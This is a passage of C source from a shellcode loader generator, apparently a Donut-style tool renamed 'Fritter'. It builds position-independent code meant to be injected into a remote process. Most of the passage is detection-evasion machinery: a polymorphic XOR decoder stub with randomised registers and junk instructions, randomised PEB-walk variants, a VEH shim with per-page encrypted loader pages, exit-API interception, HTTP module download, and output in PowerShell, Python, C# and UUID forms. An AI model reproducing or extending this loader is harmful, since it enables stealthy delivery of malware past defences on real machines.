        memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_JScript,  sizeof(GUID));
      }
    }

    // if module is an unmanaged EXE
    if(c->mod_type == FRITTER_MODULE_EXE) {
      // does the user specify parameters for the command line?
      if(c->args[0] != 0) {
        DPRINT("Copying strings required to replace command line.");
        
        strcpy(inst->dataname,   ".data");
        strcpy(inst->kernelbase, "kernelbase");
        strcpy(inst->cmd_syms,   "_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv");
      }
      // does user want loader to run the entrypoint as a thread?
      if(c->thread != 0) {
        DPRINT("Copying strings required to intercept exit-related API");
        // these exit-related API will be replaced with pointer to RtlExitUserThread
        strcpy(inst->exit_api, "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit;_o_exit");
      }
    }

    // decoy module path
    strcpy(inst->decoy, c->decoy);
    
    // if the module will be downloaded
    // set the URL parameter and request verb
    if(inst->type == FRITTER_INSTANCE_HTTP) {
      // if no module name specified
      if(c->modname[0] == 0) {
        // if entropy disabled
        if(c->entropy == FRITTER_ENTROPY_NONE) {
          // set to "AAAAAAAA"
          memset(c->modname, 'A', FRITTER_MAX_MODNAME);
        } else {
          // generate a random name for module
          // that will be saved to disk
          DPRINT("Generating random name for module");
          if(!gen_random_string(c->modname, FRITTER_MAX_MODNAME)) {
            DPRINT("gen_random_string() failed");
            err = FRITTER_ERROR_RANDOM;
            goto cleanup;
          }
        }
        DPRINT("Name for module : %s", c->modname);
      }
      strcpy(inst->server, c->server);
      // append module name
      strcat(inst->server, c->modname);
      // set the request verb
      strcpy(inst->http_req, "GET");
      
      DPRINT("Loader will attempt to download module from : %s", inst->server);
      
      // encrypt module?
      if(c->entropy == FRITTER_ENTROPY_DEFAULT) {
        DPRINT("Encrypting module");
        
        c->mod->mac = maru(inst->sig, inst->iv);
        
        fritter_encrypt(
          mod_key.mk, 
          mod_key.ctr, 
          c->mod, 
          c->mod_len);
      }
    } else 
    // if embedded, copy module to instance
    if(inst->type == FRITTER_INSTANCE_EMBED) {
      DPRINT("Copying module data to instance");
      memcpy(&c->inst->module.x, c->mod, c->mod_len);
    }

    // Fill instance padding with random bytes
    if(inst_pad_len > 0) {
      gen_random((uint8_t*)inst + inst_len - inst_pad_len, inst_pad_len);
    }

    // encrypt instance?
    if(c->entropy == FRITTER_ENTROPY_DEFAULT) {
      DPRINT("Encrypting instance");
      
      inst->mac = maru(inst->sig, inst->iv);
      
      uint8_t *inst_data = (uint8_t*)inst + offsetof(FRITTER_INSTANCE, api_cnt);
      
      fritter_encrypt(
        inst_key.mk, 
        inst_key.ctr, 
        inst_data, 
        c->inst_len - offsetof(FRITTER_INSTANCE, api_cnt));
    }
cleanup:
    // error? release memory for everything
    if(err != FRITTER_ERROR_OK) {
      DPRINT("Releasing memory for module due to errors.");
      free(c->mod);
    }
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: save_file
 * ----------------------------
 *   Creates a file and writes the contents of input buffer to it.
 *
 *   INPUT  : path = where to create file.
 *            data = what to write to file.
 *            len  = length of data.
 *
 *   OUTPUT : Fritter error code.
 */
static int save_file(const char *path, void *data, int len) {
    FILE *out;
    int  err = FRITTER_ERROR_OK;
    
    DPRINT("Entering.");
    out = fopen(path, "wb");
      
    if(out != NULL) {
      DPRINT("Writing %d bytes of %p to %s", len, data, path);
      fwrite(data, 1, len, out);
      fclose(out);
    } else err = FRITTER_ERROR_FILE_ACCESS;
    
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: save_loader
 * ----------------------------
 *   Saves the loader to output file. Also saves instance for debug builds.
 *   If the instance type is HTTP, it saves the module to file.
 *
 *   INPUT  : Fritter configuration.
 *
 *   OUTPUT : Fritter error code.
 */
static int save_loader(PFRITTER_CONFIG c) {
    int   err = FRITTER_ERROR_OK;
    FILE *fd;
    
    // if DEBUG is defined, save instance to disk
    #ifdef DEBUG
      DPRINT("Saving instance %p to file. %" PRId32 " bytes.", c->inst, c->inst_len);
      save_file("instance", c->inst, c->inst_len);
    #endif

    // If the module will be stored on a remote server
    if(c->inst_type == FRITTER_INSTANCE_HTTP) {
      DPRINT("Saving %s to file.", c->modname);
      save_file(c->modname, c->mod, c->mod_len);
    }
              
    // no output file specified?
    if(c->output[0] == 0) {
      // set to default name based on format
      switch(c->format) {
        case FRITTER_FORMAT_BINARY:
          strncpy(c->output, "loader.bin", FRITTER_MAX_NAME-1);
          break;
        case FRITTER_FORMAT_BASE64:
          strncpy(c->output, "loader.b64", FRITTER_MAX_NAME-1);
          break;
        case FRITTER_FORMAT_RUBY:
          strncpy(c->output, "loader.rb",  FRITTER_MAX_NAME-1);
          break;
        case FRITTER_FORMAT_C:
          strncpy(c->output, "loader.c",   FRITTER_MAX_NAME-1);
          break;
        case FRITTER_FORMAT_PYTHON:
          strncpy(c->output, "loader.py",  FRITTER_MAX_NAME-1);
          break;
        case FRITTER_FORMAT_POWERSHELL:
          strncpy(c->output, "loader.ps1", FRITTER_MAX_NAME-1);
          break;
        case FRITTER_FORMAT_CSHARP:
          strncpy(c->output, "loader.cs",  FRITTER_MAX_NAME-1);
          break;
        case FRITTER_FORMAT_HEX:
          strncpy(c->output, "loader.hex", FRITTER_MAX_NAME-1);
          break;
        case FRITTER_FORMAT_UUID:
          strncpy(c->output, "loader.uuid", FRITTER_MAX_NAME-1);
          break;
      }
    }
    // save loader to file
    fd = fopen(c->output, "wb");
    if(fd == NULL) {
      DPRINT("Opening %s failed.", c->output);
      return FRITTER_ERROR_FILE_ACCESS;
    }
    
    switch(c->format) {
      case FRITTER_FORMAT_BINARY: {
        DPRINT("Saving loader as binary");
        fwrite(c->pic, 1, c->pic_len, fd);
        err = FRITTER_ERROR_OK;
        break;
      }
      case FRITTER_FORMAT_BASE64: {
        DPRINT("Saving loader as base64 string");
        err = base64_template(c->pic, c->pic_len, fd);
        break;
      }
      case FRITTER_FORMAT_RUBY:
      case FRITTER_FORMAT_C:
        DPRINT("Saving loader as C/Ruby string");
        err = c_ruby_template(c->pic, c->pic_len, fd);
        break;
      case FRITTER_FORMAT_PYTHON:
        DPRINT("Saving loader as Python string");
        err = py_template(c->pic, c->pic_len, fd);
        break;
      case FRITTER_FORMAT_POWERSHELL:
        DPRINT("Saving loader as Powershell string");
        err = powershell_template(c->pic, c->pic_len, fd);
        break;
      case FRITTER_FORMAT_CSHARP:
        DPRINT("Saving loader as C# string");
        err = csharp_template(c->pic, c->pic_len, fd);
        break;
      case FRITTER_FORMAT_HEX:
        DPRINT("Saving loader as Hex string");
        err = hex_template(c->pic, c->pic_len, fd);
        break;
      case FRITTER_FORMAT_UUID:
        DPRINT("Saving loader as UUID string");
        err = uuid_template(c->pic, c->pic_len, fd);
        break;
    }
    fclose(fd);
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: build_loader
 * ----------------------------
 *   Builds the shellcode that's injected into remote process.
 *
 *   INPUT  : Fritter configuration.
 *
 *   OUTPUT : Fritter error code.
 */
static int build_loader(PFRITTER_CONFIG c) {
    // RSP alignment variants — all have 5-byte epilogue so call rel32=5 works
    // Variant 0: push rbp / mov rbp,rsp / and rsp,-0x10 / sub rsp,0x20 / call $+5 / mov rsp,rbp / pop rbp / ret
    static unsigned char RSP_ALIGN_V0[] = {
        0x55,
        0x48, 0x89, 0xE5,
        0x48, 0x83, 0xE4, 0xF0,
        0x48, 0x83, 0xEC, 0x20,
        0xE8, 0x05, 0x00, 0x00, 0x00,
        0x48, 0x89, 0xEC,
        0x5D,
        0xC3
    };
    // Variant 1: push rbx / mov rbx,rsp / and rsp,-0x10 / sub rsp,0x20 / call $+5 / mov rsp,rbx / pop rbx / ret
    static unsigned char RSP_ALIGN_V1[] = {
        0x53,
        0x48, 0x89, 0xE3,
        0x48, 0x83, 0xE4, 0xF0,
        0x48, 0x83, 0xEC, 0x20,
        0xE8, 0x05, 0x00, 0x00, 0x00,
        0x48, 0x89, 0xDC,
        0x5B,
        0xC3
    };
    // Variant 2: push rbp / lea rbp,[rsp] / and rsp,-0x10 / sub rsp,0x20 / call $+6 / lea rsp,[rbp] / pop rbp / ret
    static unsigned char RSP_ALIGN_V2[] = {
        0x55,
        0x48, 0x8D, 0x2C, 0x24,
        0x48, 0x83, 0xE4, 0xF0,
        0x48, 0x83, 0xEC, 0x20,
        0xE8, 0x06, 0x00, 0x00, 0x00,
        0x48, 0x8D, 0x65, 0x00,
        0x5D,
        0xC3
    };

    // Junk instructions that preserve RCX (for insertion between POP and RSP_ALIGN)
    static unsigned char JUNK_NOP1[] = { 0x90 };                           // nop
    static unsigned char JUNK_NOP2[] = { 0x48, 0x87, 0xC0 };             // xchg rax,rax
    static unsigned char JUNK_NOP3[] = { 0x50, 0x58 };                   // push rax; pop rax
    static unsigned char JUNK_NOP4[] = { 0x0F, 0x1F, 0x00 };             // nop dword [rax]
    static unsigned char JUNK_NOP5[] = { 0x0F, 0x1F, 0x40, 0x00 };       // nop dword [rax+0]
    static unsigned char JUNK_NOP6[] = { 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00 }; // nop word [rax+rax+0]

    struct { unsigned char *p; uint32_t n; } junk_ops[] = {
        { JUNK_NOP1, sizeof(JUNK_NOP1) },
        { JUNK_NOP2, sizeof(JUNK_NOP2) },
        { JUNK_NOP3, sizeof(JUNK_NOP3) },
        { JUNK_NOP4, sizeof(JUNK_NOP4) },
        { JUNK_NOP5, sizeof(JUNK_NOP5) },
        { JUNK_NOP6, sizeof(JUNK_NOP6) },
    };
    #define NUM_JUNK_OPS 6

    uint8_t *pl;
    uint32_t t;
    uint8_t  rnd_byte;

    // --- Feature 6: Select random PEB walk loader variant ---
    unsigned char *loader_blob;
    uint32_t       loader_size;

    gen_random(&rnd_byte, 1);
    switch(rnd_byte % 2) {
      case 0:
        loader_blob = LOADER_PEB1_EXE_X64;
        loader_size = sizeof(LOADER_PEB1_EXE_X64);
        DPRINT("Selected PEB walk order 1 (InMemoryOrderModuleList)");
        break;
      default:
        loader_blob = LOADER_PEB2_EXE_X64;
        loader_size = sizeof(LOADER_PEB2_EXE_X64);
        DPRINT("Selected PEB walk order 2 (InInitializationOrderModuleList)");
        break;
    }

    // --- Feature 2A: Random junk prefix (0-15 bytes) ---
    gen_random(&rnd_byte, 1);
    uint8_t junk_prefix_len = rnd_byte & 0x0F; // 0-15
    DPRINT("Junk prefix length: %d", junk_prefix_len);

    // --- Feature 2B: Select random RSP_ALIGN variant ---
    unsigned char *rsp_align;
    uint32_t       rsp_align_size;

    gen_random(&rnd_byte, 1);
    switch(rnd_byte % 3) {
      case 0:
        rsp_align = RSP_ALIGN_V0;
        rsp_align_size = sizeof(RSP_ALIGN_V0);
        break;
      case 1:
        rsp_align = RSP_ALIGN_V1;
        rsp_align_size = sizeof(RSP_ALIGN_V1);
        break;
      default:
        rsp_align = RSP_ALIGN_V2;
        rsp_align_size = sizeof(RSP_ALIGN_V2);
        break;
    }
    DPRINT("RSP align variant size: %d", rsp_align_size);

    // --- Feature 2C: Random junk between POP and RSP_ALIGN (0-8 bytes) ---
    uint8_t junk_mid[8];
    uint32_t junk_mid_len = 0;
    {
      gen_random(&rnd_byte, 1);
      uint32_t target = rnd_byte & 0x07; // 0-7 bytes target
      while(junk_mid_len < target) {
        gen_random(&rnd_byte, 1);
        int idx = rnd_byte % NUM_JUNK_OPS;
        if(junk_mid_len + junk_ops[idx].n > 8) break;
        memcpy(junk_mid + junk_mid_len, junk_ops[idx].p, junk_ops[idx].n);
        junk_mid_len += junk_ops[idx].n;
      }
    }
    DPRINT("Junk mid length: %d", junk_mid_len);

    // --- Feature 1: Polymorphic XOR decoder stub ---
    //
    // Two-pass assembly: emit instructions with random junk between each,
    // random register allocation, then patch RIP-relative displacements.
    // Key stored at end of stub (no jmp-short needed).
    //
    // Layout: [push rcx] [junk]* [lea key_ptr,[rip+?]] [junk]* [lea data_ptr,[rip+?]]
    //         [junk]* [mov counter, size] [junk]* [xor idx,idx] [junk]*
    //         loop: [mov al,[key_ptr+idx]] [junk]* [xor [data_ptr],al] [junk]*
    //         [inc data_ptr] [junk]* [inc idx_8] [junk]* [and idx_8,7]
    //         [dec counter] [jnz loop] [junk]* [pop rcx] [8 key bytes]
    //         (fall through to decoded loader)

    uint8_t xor_key[8];
    gen_random(xor_key, 8);

    // --- Register selection ---
    // Roles: key_ptr, data_ptr, counter, key_idx
    // RAX/AL is hardcoded for XOR byte transfer.
    // RCX is pushed/popped (instance pointer). ECX reusable inside decoder.
    // Avoid RSP(4), RBP(5) and R12-R15 (SIB complications).
    // Pool: RBX(3), RCX(1), RDX(2), RSI(6), RDI(7), R8(0+REX)
    typedef struct { uint8_t reg3; uint8_t rex; } DREG;
    static const DREG dreg_pool[] = {
      {3,0}, {1,0}, {2,0}, {6,0}, {7,0}, {0,1} // rbx,rcx,rdx,rsi,rdi,r8
    };
    #define DREG_POOL_SIZE 6

    int didx[DREG_POOL_SIZE] = {0,1,2,3,4,5};
    // Fisher-Yates shuffle
    for(int i = DREG_POOL_SIZE-1; i > 0; i--) {
      gen_random(&rnd_byte, 1);
      int j = rnd_byte % (i+1);
      int tmp = didx[i]; didx[i] = didx[j]; didx[j] = tmp;
    }
    DREG rKP  = dreg_pool[didx[0]]; // key pointer
    DREG rDP  = dreg_pool[didx[1]]; // data pointer
    DREG rCNT = dreg_pool[didx[2]]; // loop counter
    DREG rIDX = dreg_pool[didx[3]]; // key index (0-7)

    // --- Safe junk instructions (no register/memory dependencies) ---
    static const struct { uint8_t b[4]; uint8_t n; } djunk[] = {
      {{0x90},                   1}, // nop
      {{0x66, 0x90},             2}, // 66 nop
      {{0x0F, 0x1F, 0xC0},      3}, // nop eax (reg-form, no mem access)
      {{0xF8},                   1}, // clc
      {{0xF9},                   1}, // stc
      {{0xF5},                   1}, // cmc
    };
    #define DJUNK_COUNT 6

    // Helper: emit 0-3 random junk instructions into buf at offset ds
    #define EMIT_JUNK() do { \
      gen_random(&rnd_byte, 1); \
      int _jc = rnd_byte & 0x03; \
      for(int _j = 0; _j < _jc && ds < 480; _j++) { \
        gen_random(&rnd_byte, 1); \
        int _ji = rnd_byte % DJUNK_COUNT; \
        memcpy(db + ds, djunk[_ji].b, djunk[_ji].n); \
        ds += djunk[_ji].n; \
      } \
    } while(0)

    // Fixup tracking for RIP-relative displacements and JNZ
    #define FIXUP_KEY   0  // LEA key_ptr -> key data at end of stub
    #define FIXUP_DATA  1  // LEA data_ptr -> encoded loader (past end of stub)
    #define FIXUP_JNZ   2  // JNZ -> loop start
    #define MAX_FIXUPS  3
    int fixup_offset[MAX_FIXUPS];  // byte offset in db[] where displacement lives
    int fixup_end[MAX_FIXUPS];     // byte offset of end of instruction (RIP after)
    int loop_start = 0;

    uint8_t db[512]; // decoder buffer (generous)
    int ds = 0;

    // --- Pass 1: emit instructions with junk ---

    // push rcx (preserve instance pointer)
    db[ds++] = 0x51;
    EMIT_JUNK();

    // lea key_ptr, [rip+??] -> will point to key at end of stub
    db[ds++] = 0x48 | (rKP.rex << 2); // REX.W + REX.R if R8
    db[ds++] = 0x8D;
    db[ds++] = 0x05 | (rKP.reg3 << 3); // ModRM: mod=00, reg=key_ptr, rm=101(RIP)
    fixup_offset[FIXUP_KEY] = ds;

    ds += 4; // placeholder disp32
    fixup_end[FIXUP_KEY] = ds;
    EMIT_JUNK();

    // lea data_ptr, [rip+??] -> will point to encoded loader
    db[ds++] = 0x48 | (rDP.rex << 2);
    db[ds++] = 0x8D;
    db[ds++] = 0x05 | (rDP.reg3 << 3);
    fixup_offset[FIXUP_DATA] = ds;

    ds += 4;
    fixup_end[FIXUP_DATA] = ds;
    EMIT_JUNK();

    // mov counter_32, loader_size (will be re-patched to combined_size later)
    if(rCNT.rex) db[ds++] = 0x41; // REX.B for R8
    db[ds++] = 0xB8 + rCNT.reg3;
    int counter_imm_offset = ds; // track offset of the 4-byte immediate
    memcpy(db + ds, &loader_size, 4);
    ds += 4;
    EMIT_JUNK();

    // xor key_idx_32, key_idx_32 (zero the index)
    if(rIDX.rex) db[ds++] = 0x45; // REX.RB (same reg in both fields)
    db[ds++] = 0x31;
    db[ds++] = 0xC0 | (rIDX.reg3 << 3) | rIDX.reg3;
    EMIT_JUNK();

    // === decode_loop: ===
    loop_start = ds;

    // mov al, [key_ptr + key_idx]   (SIB addressing)
    {
      uint8_t rex = 0;
      if(rKP.rex || rIDX.rex) rex = 0x40 | rKP.rex | (rIDX.rex << 1);
      if(rex) db[ds++] = rex;
      db[ds++] = 0x8A; // MOV r8, r/m8
      db[ds++] = 0x04; // ModRM: mod=00, reg=AL(0), rm=100(SIB)
      db[ds++] = (rIDX.reg3 << 3) | rKP.reg3; // SIB: scale=0, index=key_idx, base=key_ptr
    }
    EMIT_JUNK();

    // xor [data_ptr], al
    {
      uint8_t rex = 0;
      if(rDP.rex) rex = 0x40 | rDP.rex;
      if(rex) db[ds++] = rex;
      db[ds++] = 0x30; // XOR r/m8, r8
      db[ds++] = rDP.reg3; // ModRM: mod=00, reg=AL(0), rm=data_ptr
    }
    EMIT_JUNK();

    // inc data_ptr (64-bit)
    db[ds++] = 0x48 | rDP.rex; // REX.W + REX.B
    db[ds++] = 0xFF;
    db[ds++] = 0xC0 | rDP.reg3; // ModRM: mod=11, reg=000(/0=INC), rm=data_ptr
    EMIT_JUNK();

    // inc key_idx low byte
    {
      uint8_t rex = 0;
      if(rIDX.rex) rex = 0x41;
      else if(rIDX.reg3 >= 4) rex = 0x40; // need REX for SIL/DIL byte access
      if(rex) db[ds++] = rex;
      db[ds++] = 0xFE;
      db[ds++] = 0xC0 | rIDX.reg3; // INC r8
    }
    EMIT_JUNK();

    // and key_idx low byte, 7
    {
      uint8_t rex = 0;
      if(rIDX.rex) rex = 0x41;
      else if(rIDX.reg3 >= 4) rex = 0x40;
      if(rex) db[ds++] = rex;
      db[ds++] = 0x80;
      db[ds++] = 0xE0 | rIDX.reg3; // AND r/m8, imm8
      db[ds++] = 0x07;
    }
    // NO junk between AND and DEC — but DEC+JNZ must be atomic (flags)
    // Actually AND sets flags too, but DEC is the one JNZ reads. Insert junk here is OK.
    EMIT_JUNK();

    // dec counter_32 + jnz loop (atomic pair — JNZ reads flags from DEC)
    if(rCNT.rex) db[ds++] = 0x41;
    db[ds++] = 0xFF;
    db[ds++] = 0xC8 | rCNT.reg3; // DEC r32
    // jnz (placeholder — patched in pass 2)
    db[ds++] = 0x75;
    fixup_offset[FIXUP_JNZ] = ds;

    ds += 1; // placeholder rel8
    fixup_end[FIXUP_JNZ] = ds;
    EMIT_JUNK();

    // pop rcx (restore instance pointer)
    db[ds++] = 0x59;
    // jmp short +8 (skip over key data to reach decoded loader)
    db[ds++] = 0xEB;
    db[ds++] = 0x08;

    // Append 8-byte XOR key at end of decoder (not executed)
    int key_offset = ds;
    memcpy(db + ds, xor_key, 8);
    ds += 8;

    uint32_t decoder_stub_size = ds;

    // --- Compute page alignment padding ---
    // The combined blob (shim+loader) must start at a page-aligned address.
    // VirtualAlloc gives 64KB-aligned memory, so we just need the offset from
    // PIC start to be a multiple of 4096.
    // Between decoder and encoded data: [lea rdx 7B] [jmp rel32 5B] [page_pad]
    uint32_t prefix_overhead = (junk_prefix_len > 0) ? (2 + junk_prefix_len) : 0;
    uint32_t pre_blob_size = prefix_overhead + 5 + c->inst_len + 1 + junk_mid_len +
                             rsp_align_size + decoder_stub_size + 7 + 5;
    uint32_t page_pad = (4096 - (pre_blob_size & 0xFFF)) & 0xFFF;
    DPRINT("Page alignment: pre_blob=%d, page_pad=%d, total_offset=%d",
           pre_blob_size, page_pad, pre_blob_size + page_pad);

    // --- Pass 2: patch displacements ---
    {
      // LEA key_ptr: target = key_offset, from = fixup_end[FIXUP_KEY]
      int32_t d = key_offset - fixup_end[FIXUP_KEY];
      memcpy(db + fixup_offset[FIXUP_KEY], &d, 4);

      // LEA data_ptr: target past lea(7) + jmp(5) + page_pad = start of encoded data
      d = (int32_t)(decoder_stub_size + 7 + 5 + page_pad) - fixup_end[FIXUP_DATA];
      memcpy(db + fixup_offset[FIXUP_DATA], &d, 4);

      // JNZ: target = loop_start, from = fixup_end[FIXUP_JNZ]
      int8_t jnz_disp = (int8_t)(loop_start - fixup_end[FIXUP_JNZ]);
      db[fixup_offset[FIXUP_JNZ]] = (uint8_t)jnz_disp;
    }

    DPRINT("Polymorphic decoder: %d bytes (regs: kp=%d dp=%d cnt=%d idx=%d)",
           decoder_stub_size, rKP.reg3, rDP.reg3, rCNT.reg3, rIDX.reg3);

    // --- VEH shim integration ---
    // Page-pad the shim so the loader starts on a page boundary
    // (VirtualAlloc allocates on 64KB boundaries, so absolute page alignment is guaranteed)
    uint32_t shim_raw_size = sizeof(VEH_SHIM_EXE_X64);
    uint32_t shim_padded_size = (shim_raw_size + 0xFFF) & ~0xFFF;  // round up to 4096
    DPRINT("VEH shim: %d bytes raw, %d bytes padded", shim_raw_size, shim_padded_size);

    // Build combined blob: [shim (page-padded)] [loader]
    uint32_t combined_size = shim_padded_size + loader_size;
    uint8_t *combined = malloc(combined_size);
    if(combined == NULL) {
      return FRITTER_ERROR_NO_MEMORY;
    }

    // Copy shim, pad with random bytes (not zeros — looks more natural)
    memcpy(combined, VEH_SHIM_EXE_X64, shim_raw_size);
    if(shim_padded_size > shim_raw_size) {
      gen_random(combined + shim_raw_size, shim_padded_size - shim_raw_size);
    }

    // Patch sentinel values in the shim blob
    // SENTINEL_LOADER_OFFSET (0xDEAD0001) → offset from shim start to loader
    // SENTINEL_LOADER_SIZE   (0xDEAD0002) → loader blob size
    // SENTINEL_VEH_MODE      (0xDEAD0003) → 0=simple RX, 1=VEH sliding window
    // SENTINEL_PAGE_KEY_HI   (0xDEAD0004) → upper 32 bits of per-page XOR key
    // SENTINEL_PAGE_KEY_LO   (0xDEAD0005) → lower 32 bits of per-page XOR key

    // Generate per-page encryption master key (used only in VEH mode)
    uint8_t page_key_bytes[8];
    gen_random(page_key_bytes, 8);
    uint64_t page_master_key;
    memcpy(&page_master_key, page_key_bytes, 8);

    {
      int patched_off = 0, patched_sz = 0, patched_mode = 0;
      int patched_pk_hi = 0, patched_pk_lo = 0;
      uint32_t veh_mode_val = (uint32_t)c->chunked;
      uint32_t pk_hi = (uint32_t)(page_master_key >> 32);
      uint32_t pk_lo = (uint32_t)(page_master_key & 0xFFFFFFFF);
      for(uint32_t i = 0; i < shim_raw_size - 3; i++) {
        uint32_t val;
        memcpy(&val, combined + i, 4);
        if(val == 0xDEAD0001 && !patched_off) {
          memcpy(combined + i, &shim_padded_size, 4);
          patched_off = 1;
          DPRINT("Patched SENTINEL_LOADER_OFFSET at shim+%d -> %d", i, shim_padded_size);
        } else if(val == 0xDEAD0002 && !patched_sz) {
          memcpy(combined + i, &loader_size, 4);
          patched_sz = 1;
          DPRINT("Patched SENTINEL_LOADER_SIZE at shim+%d -> %d", i, loader_size);
        } else if(val == 0xDEAD0003 && !patched_mode) {
          memcpy(combined + i, &veh_mode_val, 4);
          patched_mode = 1;
          DPRINT("Patched SENTINEL_VEH_MODE at shim+%d -> %d (%s)", i, veh_mode_val,
                 veh_mode_val ? "VEH sliding window" : "simple RW->RX");
        } else if(val == 0xDEAD0004 && !patched_pk_hi) {
          memcpy(combined + i, &pk_hi, 4);
          patched_pk_hi = 1;
          DPRINT("Patched SENTINEL_PAGE_KEY_HI at shim+%d", i);
        } else if(val == 0xDEAD0005 && !patched_pk_lo) {
          memcpy(combined + i, &pk_lo, 4);
          patched_pk_lo = 1;
          DPRINT("Patched SENTINEL_PAGE_KEY_LO at shim+%d", i);
        }
      }
      if(!patched_off || !patched_sz || !patched_mode) {
        DPRINT("ERROR: Failed to patch VEH shim sentinels (off=%d, sz=%d, mode=%d)",
               patched_off, patched_sz, patched_mode);
        free(combined);
        return FRITTER_ERROR_NO_MEMORY;
      }
      if(c->chunked && (!patched_pk_hi || !patched_pk_lo)) {
        DPRINT("ERROR: Failed to patch page key sentinels (hi=%d, lo=%d)",
               patched_pk_hi, patched_pk_lo);
        free(combined);
        return FRITTER_ERROR_NO_MEMORY;
      }
    }

    // Copy loader after padded shim
    memcpy(combined + shim_padded_size, loader_blob, loader_size);

    uint8_t *encoded = malloc(combined_size);
    if(encoded == NULL) {
      free(combined);
      return FRITTER_ERROR_NO_MEMORY;
    }

    if(c->chunked) {
      // VEH mode: per-page encrypt loader pages, then XOR-encode ONLY the shim
      // The outer XOR decoder will only decode the shim; loader stays per-page encrypted
      uint32_t num_pages = (loader_size + 0xFFF) / 0x1000;
      for(uint32_t pg = 0; pg < num_pages; pg++) {
        uint32_t pg_offset = pg * 0x1000;
        uint32_t pg_len = (pg_offset + 0x1000 <= loader_size) ? 0x1000 : (loader_size - pg_offset);
        uint64_t key = page_master_key ^ (uint64_t)(pg + 1);

        uint8_t *page_ptr = combined + shim_padded_size + pg_offset;
        for(uint32_t b = 0; b < pg_len / 8; b++) {
          uint64_t *qw = (uint64_t *)(page_ptr + b * 8);
          *qw ^= key;
        }
        // Handle trailing bytes on last page
        uint32_t remainder = pg_len & 7;
        if(remainder) {
          uint8_t *tail = page_ptr + (pg_len & ~7u);
          uint8_t *kb = (uint8_t *)&key;
          for(uint32_t r = 0; r < remainder; r++) {
            tail[r] ^= kb[r];
          }
        }
      }
      DPRINT("Per-page encrypted %d loader pages", num_pages);

      // Patch decoder counter to decode ONLY the shim
      memcpy(db + counter_imm_offset, &shim_padded_size, 4);
      DPRINT("Patched decoder counter: %d (shim only, loader is per-page encrypted)",
             shim_padded_size);

      // XOR-encode the shim portion
      for(uint32_t i = 0; i < shim_padded_size; i++) {
        encoded[i] = combined[i] ^ xor_key[i & 7];
      }
      // Copy per-page encrypted loader as-is
      memcpy(encoded + shim_padded_size, combined + shim_padded_size, loader_size);
    } else {
      // Simple mode: XOR-encode the entire combined blob (shim + loader)
      memcpy(db + counter_imm_offset, &combined_size, 4);
      DPRINT("Patched decoder counter: %d -> %d (shim %d + loader %d)",
             loader_size, combined_size, shim_padded_size, loader_size);

      for(uint32_t i = 0; i < combined_size; i++) {
        encoded[i] = combined[i] ^ xor_key[i & 7];
      }
    }
    free(combined);

    // --- Calculate total PIC size ---
    // Layout: [junk_prefix] [CALL 5B] [instance] [POP 1B] [junk_mid] [rsp_align]
    //         [decoder_stub] [lea rdx 7B] [jmp rel32 5B] [page_pad] [encoded(shim+loader)]
    c->pic_len = pre_blob_size + page_pad + combined_size;

    c->pic = malloc(c->pic_len);
    if(c->pic == NULL) {
      free(encoded);
      return FRITTER_ERROR_NO_MEMORY;
    }

    DPRINT("Total PIC size: %" PRId32 " bytes", c->pic_len);

    pl = (uint8_t*)c->pic;

    // --- Feature 2A: Junk prefix ---
    if(junk_prefix_len > 0) {
      PUT_BYTE(pl, 0xEB);                          // jmp short
      PUT_BYTE(pl, junk_prefix_len);               // skip N bytes
      uint8_t junk_buf[15];
      gen_random(junk_buf, junk_prefix_len);
      PUT_BYTES(pl, junk_buf, junk_prefix_len);
    }

    // call $ + c->inst_len (call over instance data)
    PUT_BYTE(pl,  0xE8);
    PUT_WORD(pl,  c->inst_len);
    PUT_BYTES(pl, c->inst, c->inst_len);
    // pop rcx
    PUT_BYTE(pl,  0x59);

    // --- Feature 2C: Junk between POP and RSP_ALIGN ---
    if(junk_mid_len > 0) {
      PUT_BYTES(pl, junk_mid, junk_mid_len);
    }

    // --- Feature 2B: RSP alignment ---
    PUT_BYTES(pl, rsp_align, rsp_align_size);

    // --- Decoder stub + trampoline + page padding + encoded(shim + loader) ---
    PUT_BYTES(pl, db, decoder_stub_size);

    // lea rdx, [rip + (5 + page_pad)] — RDX = start of decoded VehShimEntry
    // (skip past the jmp instruction and page padding)
    {
      uint8_t lea_rdx[7] = { 0x48, 0x8D, 0x15 };
      int32_t lea_disp = 5 + (int32_t)page_pad;
      memcpy(lea_rdx + 3, &lea_disp, 4);
      PUT_BYTES(pl, lea_rdx, 7);
    }

    // jmp rel32 — skip page_pad bytes to reach decoded shim
    PUT_BYTE(pl, 0xE9);
    PUT_WORD(pl, page_pad);

    // Page alignment padding (random bytes, never executed)
    if(page_pad > 0) {
      uint8_t *pad_buf = malloc(page_pad);
      if(pad_buf) {
        gen_random(pad_buf, page_pad);
        PUT_BYTES(pl, pad_buf, page_pad);
        free(pad_buf);
      }
    }

    PUT_BYTES(pl, encoded, combined_size);

    free(encoded);

    DPRINT("PIC built successfully");
    return FRITTER_ERROR_OK;
}

/**
 * Function: validate_loader_cfg
 * ----------------------------
 *   Validates Fritter configuration for loader.
 *
 *   INPUT  : Pointer to a Fritter configuration.
 *
 *   OUTPUT : Fritter error code.
 */
static int validate_loader_cfg(PFRITTER_CONFIG c) {
    uint32_t url_len;
    
    DPRINT("Validating loader configuration.");
    
    if(c == NULL || c->input[0] == 0) {
      DPRINT("No configuration or input file provided.");
      return FRITTER_ERROR_INVALID_PARAMETER;
    }

    if(c->inst_type != FRITTER_INSTANCE_EMBED &&
       c->inst_type != FRITTER_INSTANCE_HTTP) {
      
      DPRINT("Instance type %" PRIx32 " is invalid.", c->inst_type);
      return FRITTER_ERROR_INVALID_PARAMETER;
    }
    
    if(c->format < FRITTER_FORMAT_BINARY || c->format > FRITTER_FORMAT_UUID) {
      DPRINT("Format type %" PRId32 " is invalid.", c->format);
      return FRITTER_ERROR_INVALID_FORMAT;
    }
    
    if(c->entropy != FRITTER_ENTROPY_NONE   &&
       c->entropy != FRITTER_ENTROPY_RANDOM &&
       c->entropy != FRITTER_ENTROPY_DEFAULT)
    {
      DPRINT("Entropy level %" PRId32 " is invalid.", c->entropy);
      return FRITTER_ERROR_INVALID_ENTROPY;
    }
    
